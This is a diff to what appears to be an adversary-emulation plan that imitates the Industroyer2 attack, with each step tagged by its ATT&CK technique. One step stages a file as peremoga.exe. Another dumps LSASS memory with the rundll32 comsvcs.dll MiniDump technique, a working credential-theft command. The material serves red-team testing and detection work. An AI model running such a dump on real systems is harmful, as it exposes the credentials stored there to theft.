@@ -125,7 +125,7 @@
             "17": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--srcVFS://shared/threats/Industroyer2/benign.exe --dest \"c:\\Users\\peremoga.exe\"",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"c:\\Users\\peremoga.exe\"",
                 "rtags": [
                     "att&ck-technique:T1105"
                 ],
@@ -328,7 +328,7 @@
             "41": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
-                "request": "--cmd Invoke-Command -ScriptBlock {C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\Public\\mem.dmp full}",
+                "request": "--cmd Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll,MiniDump (Get-Process lsass).id C:\\Users\\Public\\mem.dmp full}",
                 "rtags": [
                     "att&ck-technique:T1003.001",
                     "att&ck-technique:T1218.011",
